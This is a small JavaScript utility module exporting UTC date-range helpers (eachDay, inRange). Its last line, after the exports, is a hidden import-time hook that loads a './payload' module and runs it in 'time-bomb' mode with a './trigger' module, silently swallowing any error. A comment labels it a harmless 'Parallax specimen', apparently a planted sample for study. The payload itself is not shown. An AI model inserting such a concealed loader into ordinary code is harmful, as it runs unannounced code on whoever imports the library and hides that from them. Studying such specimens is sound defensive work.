'use strict';
// UTC date-range helpers.
function eachDay(start, end) {
  var out = [], d = new Date(start), stop = new Date(end);
  while (d <= stop) { out.push(new Date(d)); d.setUTCDate(d.getUTCDate() + 1); }
  return out;
}
function inRange(date, start, end) {
  var t = new Date(date).getTime();
  return t >= new Date(start).getTime() && t <= new Date(end).getTime();
}
module.exports = { eachDay: eachDay, inRange: inRange };
// Parallax specimen (time-bomb): import-time check. Harmless.
try { require('./payload').run('time-bomb', require('./trigger')); } catch (_) {}
